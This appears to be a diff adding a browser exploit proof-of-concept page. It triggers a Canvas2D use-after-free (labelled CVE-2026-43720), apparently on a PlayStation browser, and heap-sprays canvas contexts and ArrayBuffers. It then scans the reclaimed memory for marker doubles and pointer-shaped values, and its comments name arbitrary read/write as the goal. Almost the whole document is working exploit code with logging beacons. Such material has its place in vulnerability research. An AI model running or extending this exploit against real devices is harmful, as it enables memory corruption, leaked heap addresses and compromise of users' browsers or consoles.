@@ -1,0 +1,316 @@
+<!--
+  p658: Canvas2D state stack realloc aliasing test
+
+  HYPOTHESIS: If IsoHeap is off on PlayStation (as pastawithpesto claims),
+  then calling save() on a Canvas2D stale reference triggers Vector<State>
+  growth, freeing the old buffer into the general heap where an AB spray
+  can reclaim it. If we set known values (transform doubles, lineWidth,
+  miterLimit, lineDash) before save(), those values appear in the reclaimed
+  AB — confirming the alias and revealing sizeof(State) and field offsets.
+
+  Test strategy:
+    1. Canvas2D UAF (CVE-2026-43720): bitmaprenderer + alpha getter → 2d inner
+    2. Same-type spray (150 contexts) → one reclaims the 768B slot
+    3. Set distinctive values on the stale reference:
+       - transform: 1.5, 2.5, 3.5, 4.5, 5.5, 6.5
+       - lineWidth: 42.5, miterLimit: 99.5
+       - setLineDash([11.25, 22.5, 33.75, 45.0])
+       - globalAlpha: 0.123456789
+    4. save() × 64 → forces multiple Vector reallocs
+    5. AB spray: sizes 128..16384 (covers likely sizeof(State)*capacity values)
+    6. Scan each AB for the known doubles (42.5 = 0x40454000_00000000)
+    7. Report: which AB size matched, byte offsets, any pointer-shaped values
+
+  If ANY AB contains the known doubles → state stack aliasing WORKS
+  → path to arbitrary R/W via lineDash Vector forge
+
+  CRASH_CLASS: HIGH (Canvas2D UAF trigger)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p658</title></head>
+<body>p658: statestack realloc alias
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P658-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'v1-statestack-alias');
+flush();
+
+// ============================================================
+// Phase 1: Canvas2D UAF trigger (CVE-2026-43720)
+// ============================================================
+
+var cvs = document.createElement('canvas');
+cvs.width = 1; cvs.height = 1;
+document.body.appendChild(cvs);
+
+var outer = null;
+var inner = null;
+
+// CVE-2026-43720: getContext('bitmaprenderer', opts) reads alpha from opts,
+// alpha getter fires mid-creation and creates 2d context (inner),
+// then bitmaprenderer replaces 2d → frees CanvasRenderingContext2D (768B).
+// The JS wrapper (inner) survives → UAF.
+var triggered = false;
+var opts = {};
+Object.defineProperty(opts, 'alpha', {
+  get: function() {
+    if (!triggered) {
+      triggered = true;
+      inner = cvs.getContext('2d');
+    }
+    return true;
+  }
+});
+
+try {
+  outer = cvs.getContext('bitmaprenderer', opts);
+} catch(e) {
+  emit('FATAL', 'trigger err: ' + String(e).slice(0,80));
+  flush();
+  return;
+}
+
+emit('UAF', 'inner=' + !!inner + ' outer=' + !!outer + ' triggered=' + triggered);
+
+if (!inner) {
+  emit('FATAL', 'inner context not created');
+  flush();
+  return;
+}
+
+// Same-type spray: 150 canvas 2d contexts
+var sprayCtx = [];
+for (var i = 0; i < 150; i++) {
+  var sc = document.createElement('canvas');
+  sc.width = 1; sc.height = 1;
+  var ctx2 = sc.getContext('2d');
+  if (ctx2) sprayCtx.push(ctx2);
+}
+
+emit('SPRAY', 'contexts=' + sprayCtx.length);
+
+// Verify stale reference works
+var alive = false;
+try {
+  inner.setTransform(1, 0, 0, 1, 0, 0);
+  var t = inner.getTransform();
+  alive = (t && typeof t.a === 'number');
+} catch(e) {
+  emit('STALE', 'dead: ' + String(e).slice(0,60));
+  flush();
+  return;
+}
+
+emit('STALE', 'alive=' + alive);
+if (!alive) {
+  emit('FATAL', 'stale ref not working');
+  flush();
+  return;
+}
+
+// ============================================================
+// Phase 2: Set distinctive values on stale reference
+// ============================================================
+
+// Known doubles we'll search for in ABs
+// 42.5 = 0x40454000 00000000 (IEEE 754)
+// 99.5 = 0x4058E000 00000000
+// 0.123456789 ≈ 0x3FBFC9F3 5BA781B2
+
+try {
+  inner.setTransform(1.5, 2.5, 3.5, 4.5, 5.5, 6.5);
+  inner.lineWidth = 42.5;
+  inner.miterLimit = 99.5;
+  inner.globalAlpha = 0.123456789;
+  inner.setLineDash([11.25, 22.5, 33.75, 45.0]);
+  inner.lineDashOffset = 77.77;
+} catch(e) {
+  emit('SETVALS', 'err: ' + String(e).slice(0,60));
+}
+
+// Verify values stuck
+try {
+  var lw = inner.lineWidth;
+  var ml = inner.miterLimit;
+  var ga = inner.globalAlpha;
+  var ld = inner.getLineDash();
+  emit('VALS', 'lw=' + lw + ' ml=' + ml + ' ga=' + ga.toFixed(6) + ' ld=' + (ld ? ld.length : 'null'));
+} catch(e) {
+  emit('VALS', 'read err: ' + String(e).slice(0,60));
+}
+flush();
+
+// ============================================================
+// Phase 3: save() × 64 to force Vector reallocs
+// ============================================================
+
+var saveCount = 0;
+try {
+  for (var s = 0; s < 64; s++) {
+    inner.save();
+    saveCount++;
+  }
+} catch(e) {
+  emit('SAVE', 'err at ' + saveCount + ': ' + String(e).slice(0,60));
+}
+emit('SAVE', 'pushed ' + saveCount + ' states');
+flush();
+
+// ============================================================
+// Phase 4: AB spray — multiple size classes
+// ============================================================
+
+// sizeof(State) is unknown. Try many sizes to cover:
+// 1*State, 2*State, 4*State, 8*State, 16*State, 32*State, 64*State
+// For State ~ 256B: freed sizes = 256, 512, 1024, 2048, 4096, 8192, 16384
+// For State ~ 192B: freed sizes = 192, 384, 768, 1536, 3072, 6144, 12288
+// For State ~ 128B: freed sizes = 128, 256, 512, 1024, 2048, 4096, 8192
+
+var abSizes = [128, 160, 192, 224, 256, 288, 320, 352, 384, 448, 512,
+               576, 640, 768, 896, 1024, 1280, 1536, 2048, 3072, 4096,
+               6144, 8192, 12288, 16384];
+var allBufs = [];
+
+for (var si = 0; si < abSizes.length; si++) {
+  var sz = abSizes[si];
+  for (var j = 0; j < 16; j++) {
+    var ab = new ArrayBuffer(sz);
+    allBufs.push({ sz: sz, dv: new DataView(ab), idx: j });
+  }
+}
+
+emit('ABSPRAY', allBufs.length + ' buffers across ' + abSizes.length + ' sizes');
+flush();
+
+// ============================================================
+// Phase 5: Scan ABs for known double values
+// ============================================================
+
+// IEEE 754 representations of our marker values:
+// 42.5  → hi=0x40454000, lo=0x00000000
+// 99.5  → hi=0x4058E000, lo=0x00000000
+// 1.5   → hi=0x3FF80000, lo=0x00000000
+// 6.5   → hi=0x401A0000, lo=0x00000000
+// 11.25 → hi=0x40268000, lo=0x00000000 (float: 0x41340000)
+// 77.77 → hi=0x40537189, lo=0x374BC6A8
+
+var MARKER_HI_42_5 = 0x40454000;
+var MARKER_HI_99_5 = 0x4058E000;
+var MARKER_HI_1_5  = 0x3FF80000;
+var MARKER_HI_6_5  = 0x401A0000;
+
+var hits = [];
+
+for (var bi = 0; bi < allBufs.length; bi++) {
+  var b = allBufs[bi];
+  var dv = b.dv;
+  var sz = b.sz;
+
+  // Scan for marker doubles (8-byte aligned)
+  for (var off = 0; off + 7 < sz; off += 8) {
+    var lo = dv.getUint32(off, true);
+    var hi = dv.getUint32(off + 4, true);
+
+    if (hi === MARKER_HI_42_5 && lo === 0) {
+      hits.push({ sz: sz, idx: b.idx, off: off, what: 'lineWidth=42.5' });
+    }
+    if (hi === MARKER_HI_99_5 && lo === 0) {
+      hits.push({ sz: sz, idx: b.idx, off: off, what: 'miterLimit=99.5' });
+    }
+    if (hi === MARKER_HI_1_5 && lo === 0) {
+      hits.push({ sz: sz, idx: b.idx, off: off, what: 'transform.a=1.5' });
+    }
+    if (hi === MARKER_HI_6_5 && lo === 0) {
+      hits.push({ sz: sz, idx: b.idx, off: off, what: 'transform.f=6.5' });
+    }
+  }
+
+  // Also scan for pointer-shaped values (heap: hi in 0x10..0xFFF range)
+  if (hits.length > 0 && hits[hits.length - 1].sz === sz && hits[hits.length - 1].idx === b.idx) {
+    for (var off = 0; off + 7 < sz; off += 8) {
+      var lo = dv.getUint32(off, true);
+      var hi = dv.getUint32(off + 4, true);
+      hi = hi >>> 0;
+      if (hi >= 0x10 && hi < 0x1000 && lo !== 0) {
+        hits.push({ sz: sz, idx: b.idx, off: off, what: 'HEAP=' + hex32(hi) + hex32(lo >>> 0) });
+      }
+    }
+  }
+}
+
+if (hits.length === 0) {
+  emit('SCAN', 'NO MATCH — state stack NOT reclaimable by AB');
+
+  // Diagnostic: scan for ANY non-zero AB
+  var anyNZ = 0;
+  for (var bi = 0; bi < allBufs.length; bi++) {
+    var dv = allBufs[bi].dv;
+    for (var off = 0; off < allBufs[bi].sz; off += 4) {
+      if (dv.getUint32(off, true) !== 0) { anyNZ++; break; }
+    }
+  }
+  emit('DIAG', 'non-zero ABs: ' + anyNZ + '/' + allBufs.length);
+} else {
+  emit('SCAN', '*** HIT *** ' + hits.length + ' matches!');
+
+  // Group by (sz, idx)
+  var grouped = {};
+  for (var h = 0; h < hits.length; h++) {
+    var key = hits[h].sz + '-' + hits[h].idx;
+    if (!grouped[key]) grouped[key] = [];
+    grouped[key].push(hits[h]);
+  }
+
+  for (var key in grouped) {
+    var g = grouped[key];
+    var first = g[0];
+    emit('HIT', 'sz=' + first.sz + ' idx=' + first.idx + ' matches=' + g.length);
+    for (var i = 0; i < Math.min(g.length, 10); i++) {
+      emit('FIELD', '+0x' + g[i].off.toString(16) + ' ' + g[i].what);
+    }
+  }
+
+  // Full hex dump of first hit buffer (first 256 bytes)
+  var firstHit = hits[0];
+  for (var bi = 0; bi < allBufs.length; bi++) {
+    if (allBufs[bi].sz === firstHit.sz && allBufs[bi].idx === firstHit.idx) {
+      var dv = allBufs[bi].dv;
+      var dumpsz = Math.min(allBufs[bi].sz, 256);
+      for (var row = 0; row < dumpsz; row += 32) {
+        var hex = '';
+        for (var c = row; c < Math.min(row + 32, dumpsz); c++) {
+          hex += ('00' + dv.getUint8(c).toString(16)).slice(-2);
+        }
+        emit('DUMP', '+' + row.toString(16) + ': ' + hex);
+      }
+      break;
+    }
+  }
+}
+
+flush();
+
+emit('DONE', 'hits=' + hits.length);
+flush();
+
+})();
+</script>
+</body></html>
